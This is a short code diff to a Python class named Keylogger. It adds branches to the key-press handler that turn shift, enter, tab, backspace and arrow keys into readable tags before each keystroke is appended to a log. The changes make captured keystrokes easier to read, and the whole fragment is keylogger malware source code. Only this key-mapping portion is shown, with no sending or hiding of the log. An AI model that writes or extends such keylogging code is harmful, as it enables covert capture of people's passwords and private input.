@@ -35,6 +35,18 @@ class Keylogger:
         except AttributeError:
             if key == key.space:
                 current_key = " "
+            elif key==key.shift:
+                current_key="<shift>"
+            elif key==None:
+                current_key=""
+            elif key== key.enter :
+                current_key="<enter>"
+            elif key==key.up or key==key.left or key==key.right or key==key.down :
+                current_key=""
+            elif key==key.tab:
+                current_key="<Tab>"
+            elif key==key.backspace:
+                current_key=" <Backspace> "
             else:
                 current_key = " " + str(key) + " "
         self.append_to_log(current_key)
